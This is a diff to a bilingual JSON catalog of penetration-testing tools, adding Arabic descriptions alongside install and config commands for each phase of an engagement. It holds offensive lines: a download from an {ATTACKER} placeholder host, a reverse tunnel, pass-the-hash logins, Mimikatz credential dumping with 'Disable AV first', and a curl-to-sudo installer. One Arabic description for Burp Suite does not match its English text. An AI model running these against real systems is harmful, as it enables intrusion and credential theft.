@@ -1,31 +1,43 @@
 [
   {
-    "cat": "Reconnaissance",
-    "icon": "\ud83d\udd0d",
+    "cat": {
+      "en": "Reconnaissance",
+      "ar": "الاستطلاع"
+    },
+    "icon": "🔍",
     "phase": "recon",
     "tools": [
       {
         "name": "theHarvester",
-        "desc": "OSINT: emails, subdomains, IPs, URLs, names from 30+ sources",
+        "desc": {
+          "en": "OSINT: emails, subdomains, IPs, URLs, names from 30+ sources",
+          "ar": "OSINT: بريد إلكتروني، نطاقات فرعية، عناوين IP، روابط، أسماء من أكثر من 30 مصدراً"
+        },
         "kali": "sudo apt install theharvester -y",
         "pip": "pip3 install theHarvester",
         "verify": "theHarvester --help",
-        "config": "Edit ~/.config/theHarvester/api-keys.yaml \u2014 add Shodan, Hunter.io, GitHub tokens",
+        "config": "Edit ~/.config/theHarvester/api-keys.yaml — add Shodan, Hunter.io, GitHub tokens",
         "url": "https://github.com/laramies/theHarvester",
         "free": true
       },
       {
         "name": "Amass",
-        "desc": "Deep DNS enumeration, ASN discovery, infrastructure mapping",
+        "desc": {
+          "en": "Deep DNS enumeration, ASN discovery, infrastructure mapping",
+          "ar": "حصر DNS عميق، اكتشاف ASN، رسم خريطة البنية التحتية"
+        },
         "install": "go install -v github.com/owasp-amass/amass/v4/...@master",
         "verify": "amass -version",
-        "config": "Create ~/.config/amass/config.ini \u2014 add API keys (Shodan, Censys, SecurityTrails)",
+        "config": "Create ~/.config/amass/config.ini — add API keys (Shodan, Censys, SecurityTrails)",
         "url": "https://github.com/owasp-amass/amass",
         "free": true
       },
       {
         "name": "Subfinder",
-        "desc": "Fast passive subdomain discovery using 50+ sources",
+        "desc": {
+          "en": "Fast passive subdomain discovery using 50+ sources",
+          "ar": "اكتشاف سلبي سريع للنطاقات الفرعية باستخدام أكثر من 50 مصدراً"
+        },
         "install": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
         "verify": "subfinder -version",
         "config": "Create ~/.config/subfinder/provider-config.yaml with API keys",
@@ -34,7 +46,10 @@
       },
       {
         "name": "httpx",
-        "desc": "Fast HTTP probing \u2014 live host detection, tech fingerprinting",
+        "desc": {
+          "en": "Fast HTTP probing — live host detection, tech fingerprinting",
+          "ar": "فحص HTTP سريع — كشف المضيفين الحيّين، بصمة التقنية"
+        },
         "install": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
         "verify": "httpx -version",
         "config": "No config needed. Pair with subfinder: subfinder -d domain | httpx -sc -title -tech-detect",
@@ -43,17 +58,26 @@
       },
       {
         "name": "Shodan CLI",
-        "desc": "Internet-wide search engine \u2014 find exposed services, CVEs",
+        "desc": {
+          "en": "Internet-wide search engine — find exposed services, CVEs",
+          "ar": "محرك بحث على مستوى الإنترنت — إيجاد الخدمات المكشوفة وCVEs"
+        },
         "kali": "pip3 install shodan",
         "verify": "shodan --version",
-        "config": "shodan init YOUR_API_KEY  (get key at shodan.io \u2014 free tier available)",
+        "config": "shodan init YOUR_API_KEY  (get key at shodan.io — free tier available)",
         "url": "https://cli.shodan.io",
         "free": false,
-        "paid": "Free: 100 queries/month. Membership $49/mo for full access. Essential for professional work."
+        "paid": {
+          "en": "Free: 100 queries/month. Membership $49/mo for full access. Essential for professional work.",
+          "ar": "مجاني: 100 استعلام/شهر. الاشتراك 49$/شهرياً للوصول الكامل. ضروري للعمل الاحترافي."
+        }
       },
       {
         "name": "TruffleHog",
-        "desc": "Find secrets, API keys, credentials in Git repos",
+        "desc": {
+          "en": "Find secrets, API keys, credentials in Git repos",
+          "ar": "إيجاد الأسرار ومفاتيح API وبيانات الاعتماد في مستودعات Git"
+        },
         "kali": "pip3 install trufflehog",
         "install": "go install github.com/trufflesecurity/trufflehog/v3@latest",
         "verify": "trufflehog --help",
@@ -63,7 +87,10 @@
       },
       {
         "name": "Gobuster",
-        "desc": "Directory/file/DNS/VHost brute-forcing",
+        "desc": {
+          "en": "Directory/file/DNS/VHost brute-forcing",
+          "ar": "تخمين الدلائل/الملفات/DNS/VHost"
+        },
         "kali": "sudo apt install gobuster -y",
         "install": "go install github.com/OJ/gobuster/v3@latest",
         "verify": "gobuster version",
@@ -73,7 +100,10 @@
       },
       {
         "name": "ffuf",
-        "desc": "Fastest web fuzzer \u2014 APIs, directories, parameters",
+        "desc": {
+          "en": "Fastest web fuzzer — APIs, directories, parameters",
+          "ar": "أسرع أداة fuzzing للويب — واجهات API، الدلائل، المعاملات"
+        },
         "install": "go install github.com/ffuf/ffuf/v2@latest",
         "verify": "ffuf -V",
         "config": "Works out of box. Combine with SecLists.",
@@ -83,13 +113,19 @@
     ]
   },
   {
-    "cat": "Scanning",
-    "icon": "\ud83d\udce1",
+    "cat": {
+      "en": "Scanning",
+      "ar": "الفحص"
+    },
+    "icon": "📡",
     "phase": "scan",
     "tools": [
       {
         "name": "Nmap",
-        "desc": "#1 network scanner \u2014 port scan, service detection, vulnerability scripts",
+        "desc": {
+          "en": "#1 network scanner — port scan, service detection, vulnerability scripts",
+          "ar": "الماسح الشبكي رقم 1 — فحص المنافذ، كشف الخدمات، سكربتات الثغرات"
+        },
         "kali": "sudo apt install nmap -y",
         "mac": "brew install nmap",
         "verify": "nmap --version",
@@ -99,7 +135,10 @@
       },
       {
         "name": "Masscan",
-        "desc": "Fastest port scanner \u2014 scan full internet, millions of packets/sec",
+        "desc": {
+          "en": "Fastest port scanner — scan full internet, millions of packets/sec",
+          "ar": "أسرع ماسح منافذ — فحص الإنترنت بالكامل، ملايين الحزم في الثانية"
+        },
         "kali": "sudo apt install masscan -y",
         "verify": "masscan --version",
         "config": "Requires root. Always rate-limit: --rate 10000. Never run at full speed on engagements.",
@@ -108,7 +147,10 @@
       },
       {
         "name": "Nuclei",
-        "desc": "Template-based vuln scanner \u2014 8000+ community templates",
+        "desc": {
+          "en": "Template-based vuln scanner — 8000+ community templates",
+          "ar": "ماسح ثغرات قائم على القوالب — أكثر من 8000 قالب مجتمعي"
+        },
         "install": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
         "verify": "nuclei -version",
         "config": "nuclei -update-templates  (run weekly to get latest checks)",
@@ -117,7 +159,10 @@
       },
       {
         "name": "Nikto",
-        "desc": "Web server scanner \u2014 outdated software, dangerous files, misconfigs",
+        "desc": {
+          "en": "Web server scanner — outdated software, dangerous files, misconfigs",
+          "ar": "ماسح خادم ويب — برامج قديمة، ملفات خطرة، إعدادات خاطئة"
+        },
         "kali": "sudo apt install nikto -y",
         "verify": "nikto -Version",
         "config": "No config needed. Basic: nikto -h {TARGET} -o nikto.html -Format html",
@@ -126,7 +171,10 @@
       },
       {
         "name": "testssl.sh",
-        "desc": "Test SSL/TLS configuration on any port",
+        "desc": {
+          "en": "Test SSL/TLS configuration on any port",
+          "ar": "اختبار إعدادات SSL/TLS على أي منفذ"
+        },
         "install": "git clone --depth 1 https://github.com/drwetter/testssl.sh.git && cd testssl.sh",
         "verify": "./testssl.sh --version",
         "config": "No dependencies except bash. Works on any system.",
@@ -135,17 +183,26 @@
       },
       {
         "name": "Burp Suite Pro",
-        "desc": "#1 web application security testing platform \u2014 proxy, scanner, intruder",
+        "desc": {
+          "en": "#1 web application security testing platform — proxy, scanner, intruder",
+          "ar": "منصة اختبار أمان تطبيقات الويب رقم 1 — وكيل، ماسح، Intruder"
+        },
         "install": "Download from portswigger.net\njava -jar burpsuite_pro.jar",
         "verify": "Help > About Burp",
         "config": "Set proxy 127.0.0.1:8080 in browser. Install CA cert: http://burpsuite/cert\nExtensions to install: Param Miner, JWT Editor, Active Scan++, Turbo Intruder",
         "url": "https://portswigger.net/burp/pro",
         "free": false,
-        "paid": "Community: free (no scanner). Pro: $449/year. Worth every dollar for professional work."
+        "paid": {
+          "en": "Community: free (no scanner). Pro: $449/year. Worth every dollar for professional work.",
+          "ar": "النسخة المجتمعية: مجانية (دون ماسح). Pro: 449$/سنوياً. تستحق كل دولار للعمل الاحترافي."
+        }
       },
       {
         "name": "SQLMap",
-        "desc": "Automated SQL injection detection and exploitation",
+        "desc": {
+          "en": "Automated SQL injection detection and exploitation",
+          "ar": "كشف واستغلال آلي لحقن SQL"
+        },
         "kali": "sudo apt install sqlmap -y",
         "verify": "sqlmap --version",
         "config": "Always use --level 3 --risk 2 for thorough testing. --tamper for WAF bypass.",
@@ -154,7 +211,10 @@
       },
       {
         "name": "BloodHound",
-        "desc": "Active Directory attack path visualization",
+        "desc": {
+          "en": "Active Directory attack path visualization",
+          "ar": "تصور مسارات هجوم Active Directory"
+        },
         "install": "# Get BloodHound binary from GitHub releases\n# Install Neo4j: sudo apt install neo4j -y\n# Data collection: pip3 install bloodhound\n# OR use SharpHound.exe on target",
         "verify": "bloodhound-python --help",
         "config": "sudo neo4j start  |  Username: neo4j, set new password  |  Open BloodHound app",
@@ -163,7 +223,10 @@
       },
       {
         "name": "CrackMapExec",
-        "desc": "Swiss army knife for Windows/AD pentesting",
+        "desc": {
+          "en": "Swiss army knife for Windows/AD pentesting",
+          "ar": "أداة شاملة لاختبار اختراق Windows/AD"
+        },
         "kali": "sudo apt install crackmapexec -y",
         "pip": "pip3 install crackmapexec",
         "verify": "crackmapexec --version",
@@ -174,13 +237,19 @@
     ]
   },
   {
-    "cat": "Exploitation",
-    "icon": "\u26a1",
+    "cat": {
+      "en": "Exploitation",
+      "ar": "الاستغلال"
+    },
+    "icon": "⚡",
     "phase": "exploit",
     "tools": [
       {
         "name": "Metasploit",
-        "desc": "World's most used penetration testing framework",
+        "desc": {
+          "en": "World's most used penetration testing framework",
+          "ar": "إطار عمل اختبار الاختراق الأكثر استخداماً في العالم"
+        },
         "kali": "msfupdate  (pre-installed on Kali)",
         "install": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo ruby",
         "verify": "msfconsole --version",
@@ -190,7 +259,10 @@
       },
       {
         "name": "Hydra",
-        "desc": "Fast network login cracker \u2014 50+ protocols",
+        "desc": {
+          "en": "Fast network login cracker — 50+ protocols",
+          "ar": "كاسر تسجيل دخول شبكي سريع — أكثر من 50 بروتوكولاً"
+        },
         "kali": "sudo apt install hydra -y",
         "verify": "hydra -h",
         "config": "Best with SecLists: /usr/share/seclists/Passwords/rockyou.txt",
@@ -199,16 +271,22 @@
       },
       {
         "name": "Responder",
-        "desc": "LLMNR/NBT-NS/mDNS poisoner for credential capture",
+        "desc": {
+          "en": "LLMNR/NBT-NS/mDNS poisoner for credential capture",
+          "ar": "مُسمِّم LLMNR/NBT-NS/mDNS لالتقاط بيانات الاعتماد"
+        },
         "install": "git clone https://github.com/lgandx/Responder.git\ncd Responder",
         "verify": "python3 Responder.py --help",
-        "config": "Edit Responder.conf \u2014 toggle SMB/HTTP/FTP on/off\nRequires root. Run on same network segment as targets.",
+        "config": "Edit Responder.conf — toggle SMB/HTTP/FTP on/off\nRequires root. Run on same network segment as targets.",
         "url": "https://github.com/lgandx/Responder",
         "free": true
       },
       {
         "name": "Impacket",
-        "desc": "Python classes for network protocols \u2014 secretsdump, psexec, wmiexec",
+        "desc": {
+          "en": "Python classes for network protocols — secretsdump, psexec, wmiexec",
+          "ar": "فئات Python لبروتوكولات الشبكة — secretsdump، psexec، wmiexec"
+        },
         "kali": "pip3 install impacket",
         "install": "git clone https://github.com/fortra/impacket && pip3 install .",
         "verify": "impacket-secretsdump --help",
@@ -218,7 +296,10 @@
       },
       {
         "name": "John the Ripper",
-        "desc": "Password hash cracker",
+        "desc": {
+          "en": "Password hash cracker",
+          "ar": "كاسر هاشات كلمات المرور"
+        },
         "kali": "sudo apt install john -y",
         "verify": "john --version",
         "config": "john --list=formats  (see supported hash types)\nWordlist: /usr/share/wordlists/rockyou.txt",
@@ -227,7 +308,10 @@
       },
       {
         "name": "Hashcat",
-        "desc": "World's fastest GPU password cracker",
+        "desc": {
+          "en": "World's fastest GPU password cracker",
+          "ar": "أسرع كاسر كلمات مرور بمعالج الرسوميات في العالم"
+        },
         "kali": "sudo apt install hashcat -y",
         "verify": "hashcat --version",
         "config": "hashcat -m 0 hash.txt wordlist.txt (MD5)\nhashcat -m 1000 hash.txt wordlist.txt (NTLM)\nhashcat --benchmark  (test GPU speed)",
@@ -237,13 +321,19 @@
     ]
   },
   {
-    "cat": "Post-Exploitation",
-    "icon": "\ud83c\udff4",
+    "cat": {
+      "en": "Post-Exploitation",
+      "ar": "ما بعد الاستغلال"
+    },
+    "icon": "🏴",
     "phase": "postex",
     "tools": [
       {
         "name": "LinPEAS",
-        "desc": "Linux privilege escalation script \u2014 finds 100+ escalation vectors",
+        "desc": {
+          "en": "Linux privilege escalation script — finds 100+ escalation vectors",
+          "ar": "سكربت تصعيد صلاحيات Linux — يجد أكثر من 100 متجه تصعيد"
+        },
         "install": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nchmod +x linpeas.sh",
         "verify": "./linpeas.sh -h",
         "config": "Transfer to target: python3 -m http.server 8080  |  wget http://{ATTACKER}/linpeas.sh",
@@ -252,7 +342,10 @@
       },
       {
         "name": "WinPEAS",
-        "desc": "Windows privilege escalation script",
+        "desc": {
+          "en": "Windows privilege escalation script",
+          "ar": "سكربت تصعيد صلاحيات Windows"
+        },
         "install": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat\n# OR .exe version for more checks",
         "verify": "winPEAS.bat help",
         "config": "Run as current user first, then as higher privilege if escalated",
@@ -261,7 +354,10 @@
       },
       {
         "name": "Evil-WinRM",
-        "desc": "WinRM shell \u2014 full-featured Windows remote shell for pentesting",
+        "desc": {
+          "en": "WinRM shell — full-featured Windows remote shell for pentesting",
+          "ar": "صدفة WinRM — صدفة Windows عن بُعد شاملة لاختبار الاختراق"
+        },
         "install": "gem install evil-winrm",
         "verify": "evil-winrm --help",
         "config": "evil-winrm -i {TARGET_IP} -u {USER} -p {PASSWORD}\nevil-winrm -i {TARGET_IP} -u {USER} -H {NTLM_HASH}  (pass-the-hash)",
@@ -270,7 +366,10 @@
       },
       {
         "name": "Chisel",
-        "desc": "TCP/UDP tunnel over HTTP \u2014 bypass firewalls and NAT",
+        "desc": {
+          "en": "TCP/UDP tunnel over HTTP — bypass firewalls and NAT",
+          "ar": "نفق TCP/UDP عبر HTTP — تجاوز جدران الحماية وNAT"
+        },
         "install": "go install github.com/jpillora/chisel@latest",
         "verify": "chisel --help",
         "config": "Server (attacker): chisel server -p 8080 --reverse\nClient (target): chisel client {ATTACKER}:8080 R:socks\nProxy via: proxychains nmap {INTERNAL_TARGET}",
@@ -279,7 +378,10 @@
       },
       {
         "name": "Ligolo-ng",
-        "desc": "Tunneling via TUN interface \u2014 cleaner pivoting than Chisel",
+        "desc": {
+          "en": "Tunneling via TUN interface — cleaner pivoting than Chisel",
+          "ar": "الارتداد عبر واجهة TUN — ارتداد أنظف من Chisel"
+        },
         "install": "go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest\ngo install github.com/nicocha30/ligolo-ng/cmd/agent@latest",
         "verify": "proxy --help",
         "config": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
@@ -288,7 +390,10 @@
       },
       {
         "name": "Mimikatz",
-        "desc": "Extract credentials/hashes/tickets from Windows memory \u2014 the red team essential",
+        "desc": {
+          "en": "Extract credentials/hashes/tickets from Windows memory — the red team essential",
+          "ar": "استخراج بيانات الاعتماد/الهاشات/التذاكر من ذاكرة Windows — أساسي للفريق الأحمر"
+        },
         "install": "# Download release from GitHub:\n# On Kali: /usr/share/windows-resources/mimikatz/",
         "verify": "mimikatz.exe  (run on Windows target)",
         "config": "Needs Admin/SYSTEM. Disable AV first.\nKey commands:\nsekurlsa::logonpasswords\nlsadump::sam\nkerberos::list /export",
@@ -298,13 +403,19 @@
     ]
   },
   {
-    "cat": "Cloud",
-    "icon": "\u2601\ufe0f",
+    "cat": {
+      "en": "Cloud",
+      "ar": "السحابة"
+    },
+    "icon": "☁️",
     "phase": "cloud",
     "tools": [
       {
         "name": "AWS CLI",
-        "desc": "Official AWS command line interface",
+        "desc": {
+          "en": "Official AWS command line interface",
+          "ar": "واجهة سطر الأوامر الرسمية لـAWS"
+        },
         "install": "pip3 install awscli",
         "verify": "aws --version",
         "config": "aws configure\n# Enter: Access Key ID, Secret Access Key, Region, Output format",
@@ -313,7 +424,10 @@
       },
       {
         "name": "ScoutSuite",
-        "desc": "Multi-cloud security auditing \u2014 AWS, Azure, GCP, OCI",
+        "desc": {
+          "en": "Multi-cloud security auditing — AWS, Azure, GCP, OCI",
+          "ar": "تدقيق أمني متعدد السحابات — AWS، Azure، GCP، OCI"
+        },
         "install": "pip3 install scoutsuite",
         "verify": "scout --help",
         "config": "Requires cloud credentials configured before running",
@@ -322,7 +436,10 @@
       },
       {
         "name": "Prowler",
-        "desc": "AWS/Azure/GCP security assessments \u2014 CIS, GDPR, HIPAA, SOC2",
+        "desc": {
+          "en": "AWS/Azure/GCP security assessments — CIS, GDPR, HIPAA, SOC2",
+          "ar": "تقييمات أمنية لـAWS/Azure/GCP — CIS، GDPR، HIPAA، SOC2"
+        },
         "install": "pip3 install prowler",
         "verify": "prowler -v",
         "config": "Configure cloud credentials first. prowler aws -f us-east-1",
@@ -331,7 +448,10 @@
       },
       {
         "name": "Pacu",
-        "desc": "AWS exploitation framework \u2014 IAM privesc, recon, data exfil",
+        "desc": {
+          "en": "AWS exploitation framework — IAM privesc, recon, data exfil",
+          "ar": "إطار عمل استغلال AWS — تصعيد صلاحيات IAM، استطلاع، استخراج بيانات"
+        },
         "install": "git clone https://github.com/RhinoSecurityLabs/pacu.git\ncd pacu && pip3 install -r requirements.txt",
         "verify": "python3 pacu.py",
         "config": "Start: python3 pacu.py\nImport keys: import_keys {PROFILE}\nList modules: ls",
@@ -340,7 +460,10 @@
       },
       {
         "name": "Azure CLI",
-        "desc": "Official Azure command line interface",
+        "desc": {
+          "en": "Official Azure command line interface",
+          "ar": "واجهة سطر الأوامر الرسمية لـAzure"
+        },
         "install": "pip3 install azure-cli\n# OR: curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash",
         "verify": "az --version",
         "config": "az login  (opens browser for auth)",
@@ -350,23 +473,35 @@
     ]
   },
   {
-    "cat": "API Testing",
-    "icon": "\ud83d\udd0c",
+    "cat": {
+      "en": "API Testing",
+      "ar": "اختبار API"
+    },
+    "icon": "🔌",
     "phase": "api",
     "tools": [
       {
         "name": "Burp Suite Pro",
-        "desc": "Best-in-class for API testing \u2014 replay, intruder, scanner all work on APIs",
+        "desc": {
+          "en": "Best-in-class for API testing — replay, intruder, scanner all work on APIs",
+          "ar": "منصة اختبار أمان تطبيقات الويب رقم 1 — وكيل، ماسح، Intruder"
+        },
         "install": "See Scanning section",
         "verify": "",
         "config": "REST API testing: send to Repeater, use Intruder for parameter fuzzing\nInstall extensions: JWT Editor, OpenAPI Parser, GraphQL Raider",
         "url": "https://portswigger.net/burp",
         "free": false,
-        "paid": "Pro required for scanner. Community is functional for manual testing."
+        "paid": {
+          "en": "Pro required for scanner. Community is functional for manual testing.",
+          "ar": "النسخة Pro مطلوبة للماسح. النسخة المجتمعية تعمل للاختبار اليدوي."
+        }
       },
       {
         "name": "Kiterunner",
-        "desc": "API-aware content discovery \u2014 understands route patterns",
+        "desc": {
+          "en": "API-aware content discovery — understands route patterns",
+          "ar": "اكتشاف محتوى واعٍ بـAPI — يفهم أنماط المسارات"
+        },
         "install": "go install github.com/assetnote/kiterunner/cmd/kr@latest",
         "verify": "kr help",
         "config": "Download wordlists: https://wordlists.assetnote.io/\nMain wordlist: routes-large.kite",
@@ -375,7 +510,10 @@
       },
       {
         "name": "graphql-cop",
-        "desc": "GraphQL security auditor \u2014 introspection, injection, batching",
+        "desc": {
+          "en": "GraphQL security auditor — introspection, injection, batching",
+          "ar": "مدقق أمان GraphQL — استبطان، حقن، تجميع"
+        },
         "install": "pip3 install graphql-cop",
         "verify": "graphql-cop --help",
         "config": "graphql-cop -t https://target.com/graphql -v",
@@ -384,7 +522,10 @@
       },
       {
         "name": "HTTPie",
-        "desc": "Human-friendly curl alternative \u2014 perfect for API testing",
+        "desc": {
+          "en": "Human-friendly curl alternative — perfect for API testing",
+          "ar": "بديل curl سهل الاستخدام — مثالي لاختبار API"
+        },
         "install": "pip3 install httpie",
         "verify": "http --version",
         "config": "http GET https://api.target.com/users Authorization:'Bearer TOKEN'\nhttp POST https://api.target.com/users name=test role=admin",
@@ -393,7 +534,10 @@
       },
       {
         "name": "Postman",
-        "desc": "API platform for building and testing API requests",
+        "desc": {
+          "en": "API platform for building and testing API requests",
+          "ar": "منصة API لبناء واختبار طلبات API"
+        },
         "install": "Download from postman.com",
         "verify": "Launch app",
         "config": "Import OpenAPI spec to generate all endpoints automatically\nSet environment variables for auth tokens",
@@ -403,13 +547,19 @@
     ]
   },
   {
-    "cat": "Reporting",
-    "icon": "\ud83d\udcca",
+    "cat": {
+      "en": "Reporting",
+      "ar": "التقارير"
+    },
+    "icon": "📊",
     "phase": "report",
     "tools": [
       {
         "name": "Sysreptor",
-        "desc": "Best self-hosted pentest reporting platform \u2014 markdown-based, professional templates",
+        "desc": {
+          "en": "Best self-hosted pentest reporting platform — markdown-based, professional templates",
+          "ar": "أفضل منصة تقارير اختبار اختراق ذاتية الاستضافة — قائمة على markdown، قوالب احترافية"
+        },
         "install": "git clone https://github.com/Syslifters/sysreptor && cd sysreptor\ndocker-compose up -d",
         "verify": "http://localhost:8000",
         "config": "Default creds in .env file. Change immediately. CVSS calculator built-in.",
@@ -418,7 +568,10 @@
       },
       {
         "name": "Pandoc",
-        "desc": "Convert markdown reports to Word/PDF/HTML",
+        "desc": {
+          "en": "Convert markdown reports to Word/PDF/HTML",
+          "ar": "تحويل تقارير markdown إلى Word/PDF/HTML"
+        },
         "install": "sudo apt install pandoc -y\nsudo apt install texlive-latex-base  (for PDF)",
         "verify": "pandoc --version",
         "config": "pandoc report.md -o report.docx\npandoc report.md -o report.pdf --pdf-engine=xelatex",
@@ -427,7 +580,10 @@
       },
       {
         "name": "Obsidian",
-        "desc": "Knowledge management \u2014 perfect for engagement notes with linking",
+        "desc": {
+          "en": "Knowledge management — perfect for engagement notes with linking",
+          "ar": "إدارة المعرفة — مثالية لملاحظات المهام مع الربط"
+        },
         "install": "Download from obsidian.md",
         "verify": "Launch app",
         "config": "Create vault per client. Use templates for consistent note-taking. Enable backlinks.",
